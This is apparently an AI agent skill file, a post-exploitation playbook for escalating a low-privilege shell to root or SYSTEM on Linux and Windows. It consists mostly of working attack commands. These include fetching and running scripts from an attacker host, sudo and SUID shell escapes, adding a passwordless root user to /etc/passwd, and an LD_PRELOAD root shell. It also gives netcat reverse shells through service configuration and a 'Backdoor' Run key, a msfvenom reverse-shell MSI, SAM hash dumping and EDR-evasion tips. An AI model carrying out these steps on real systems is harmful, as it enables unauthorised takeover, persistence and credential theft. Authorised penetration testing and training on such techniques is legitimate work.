---
name: privilege-escalation
description: Linux and Windows privilege escalation techniques, enumeration scripts, and common misconfigurations. Use when you have obtained a low-privilege shell and need to escalate to root or SYSTEM.
metadata:
  hermes:
    category: post-exploitation
    tags: [privesc, linux, windows, enumeration, sudo, kernel]
platforms: [linux, macos, windows]
---

# Privilege Escalation

## When to Use

Use this skill when you have:
- A low-privilege shell on a Linux or Windows target
- Need to escalate to root / SYSTEM / Administrator
- Want a structured enumeration and exploitation approach

---

## Linux Privilege Escalation

### Step 1: Automated Enumeration

Run these first (they are fast and catch most low-hanging fruit):

```bash
# LinPEAS — comprehensive automated enumeration
wget http://ATTACKER/linpeas.sh -O /tmp/linpeas.sh && bash /tmp/linpeas.sh

# linux-smart-enumeration (faster, tiered output)
wget http://ATTACKER/lse.sh -O /tmp/lse.sh && bash /tmp/lse.sh -l2

# Manual quick checks
id; whoami; groups; uname -a; cat /etc/os-release
```

### Step 2: Kernel Exploits

**Check:** `uname -r` and search for known exploits.

| Kernel Version | Exploit | Notes |
|----------------|---------|-------|
| 2.6.x - 4.8.x | Dirty COW (CVE-2016-5195) | Race condition in copy-on-write |
| 3.13 - 5.8 | BPF sig verifier (CVE-2021-3490) | eBPF signed bounds check bypass |
| 5.8 - 5.16 | Dirty Pipe (CVE-2022-0847) | splicing arbitrary writes to read-only files |
| 5.15+ | CVE-2023-32629 / GameOver(lay) | Ubuntu overlayfs unprivileged user ns |

**Procedure:**
1. Identify exact kernel: `uname -r`
2. Search exploit-db or `searchsploit linux kernel $(uname -r)`
3. Compile on target if possible (avoids libc mismatch):
   ```bash
   gcc exploit.c -o exploit && ./exploit
   ```
4. If no compiler, compile statically on attacker with matching architecture:
   ```bash
   gcc -static exploit.c -o exploit
   ```

### Step 3: Sudo Abuse

```bash
sudo -l
```

**Common misconfigurations:**
- `(ALL) NOPASSWD: ALL` → immediate root via `sudo su`
- Specific binaries with known escapes:
  - `sudo vim` → `:!/bin/sh`
  - `sudo less` → `!/bin/sh`
  - `sudo find . -exec /bin/sh \;`
  - `sudo awk 'BEGIN {system("/bin/sh")}'`
  - `sudo python3 -c 'import os; os.system("/bin/sh")'`
  - `sudo ruby -e 'exec "/bin/sh"'`
  - `sudo perl -e 'exec "/bin/sh"'`
  - `sudo git -p help` → `!/bin/sh`
  - `sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh`
  - `sudo mysql -e '! /bin/sh'`

Reference: `references/gtfo-bin-sudo.txt`

### Step 4: SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

**High-value targets:**
- `nmap --interactive` (deprecated but still found)
- `vim`, `less`, `more`, `nano` — same escapes as sudo
- `find`, `awk`, `python*`, `perl`, `ruby`, `php*` — script interpreter escapes
- `cp`, `mv`, `ln` — overwrite sensitive files (e.g., `/etc/passwd`, `/etc/sudoers`)
- `tar`, `zip` — wildcard injection via checkpoint actions
- `pwnkit` (`pkexec`) — if version is vulnerable (CVE-2021-4034)

### Step 5: Capabilities

```bash
getcap -r / 2>/dev/null
```

**Dangerous capabilities:**
- `cap_setuid+ep` on python/perl/ruby → setuid(0) + exec /bin/sh
- `cap_dac_read_search+ep` → read any file (shadow, ssh keys)
- `cap_sys_admin+ep` → mount abuse, namespace escapes

### Step 6: Cron Jobs & Writable Paths

```bash
cat /etc/crontab
ls -la /etc/cron.*
find /etc/cron* -type f -perm -o+w 2>/dev/null
```

**Exploitation:**
- If cron runs a script in a world-writable directory, replace it.
- If cron runs a binary without absolute path, hijack via PATH manipulation.
- If cron runs `* * * * * root /opt/backup.sh` and `/opt` is writable, overwrite `backup.sh`.

### Step 7: Path Hijacking

```bash
echo $PATH
```

If you can write to any directory in PATH, create a fake binary:
```bash
cat > /tmp/ls << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/ls
export PATH=/tmp:$PATH
# Wait for root to run 'ls' or trigger it via sudo/cron
```

### Step 8: Writable /etc/passwd or /etc/sudoers

```bash
ls -la /etc/passwd /etc/sudoers /etc/sudoers.d/
```

If writable, add a root user:
```bash
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

Or add sudo rule:
```bash
echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo su
```

### Step 9: LD_PRELOAD / LD_LIBRARY_PATH

If `env_keep` includes LD_PRELOAD in sudoers, or if you can influence a SUID binary's environment:
```bash
gcc -fPIC -shared -o /tmp/root.so /tmp/root.c -nostartfiles
cat > /tmp/root.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash -p");
}
EOF
sudo LD_PRELOAD=/tmp/root.so <any_binary>
```

---

## Windows Privilege Escalation

### Step 1: Automated Enumeration

```powershell
# WinPEAS
.\winPEASany.exe

# PowerUp
Import-Module .\PowerUp.ps1; Invoke-AllChecks

# Manual quick checks
whoami /priv
whoami /groups
systeminfo
net user
```

### Step 2: Kernel Exploits

| Vulnerability | CVE | Affected Versions |
|---------------|-----|-------------------|
| PrintNightmare | CVE-2021-34527 | Windows 7+ |
| HiveNightmare / SeriousSAM | CVE-2021-36934 | Windows 10 1809 - 21H1 |
| TokenKidnapping | CVE-2019-1132 | Windows 7/8/10/Server |
| JuicyPotato / RoguePotato | N/A | Windows 7/8/8.1/Server 2012 |
| RottenPotatoNG | N/A | Windows 7/8/10/Server 2016 |
| GodPotato | N/A | Windows Server 2012 - 2022 |
| SweetPotato | N/A | Windows 8.1 / Server 2012+ |

**Procedure:**
1. Check service account privileges: `whoami /priv`
2. If `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is present, use potato family.
3. If `SeBackupPrivilege` is present, use diskshadow + robocopy or raw registry read.

### Step 3: Service Misconfiguration

```powershell
# Find services with weak permissions
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv "Everyone" *

# Check if service binary path is writable
sc qc <service_name>
icacls "C:\Program Files\VulnerableApp\service.exe"
```

**Exploitation:**
- If service binary is writable, replace it with your payload and restart service.
- If service config is modifiable by low-priv user, change `BINARY_PATH_NAME`:
  ```cmd
  sc config <service_name> binPath= "C:\nc.exe -e cmd ATTACKER PORT"
  sc start <service_name>
  ```
- If service runs with `SERVICE_START_NAME` as `LocalSystem`, any code runs as SYSTEM.

### Step 4: Unquoted Service Paths

```powershell
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

If path contains spaces and is unquoted:
```
C:\Program Files\Some App\bin\service.exe
```

Create `C:\Program.exe` or `C:\Program Files\Some.exe` — Windows tries these first.

### Step 5: AlwaysInstallElevated

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If both are `0x1`, create malicious MSI:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=PORT -f msi -o evil.msi
```
Then on target: `msiexec /quiet /qn /i C:\temp\evil.msi`

### Step 6: Registry Run Keys (Writable)

```powershell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
icacls "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

If writable, add payload for next login:
```cmd
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\nc.exe -e cmd ATTACKER PORT" /f
```

### Step 7: Stored Credentials

```powershell
# Credential Manager
cmdkey /list

# Registry saved creds
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# SAM / SYSTEM hashes
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system
# Extract hashes offline with secretsdump.py or impacket
```

---

## Pitfalls

- **Kernel exploit without backup:** Always `cp /etc/passwd /tmp/` or snapshot before kernel exploitation. A bad exploit can crash the system.
- ** noisy enumeration:** `linpeas` is noisy. If stealth matters, run `lse.sh` first or do manual checks.
- **Wrong architecture:** Ensure exploit matches target architecture (x86 vs x64). `uname -m` on Linux, `echo %PROCESSOR_ARCHITECTURE%` on Windows.
- **Overwriting critical binaries:** When replacing service binaries, keep a backup to restore.
- **Detection:** Potato exploits are well-detected by EDR. Consider `GodPotato` or `SweetPotato` for modern bypasses.

## Verification Checklist

- [ ] `id` returns `uid=0(root)` or `whoami` returns `nt authority\system`
- [ ] Can read `/root/flag.txt`, `/root/root.txt`, or `C:\Users\Administrator\Desktop\root.txt`
- [ ] Stable shell with elevated privileges
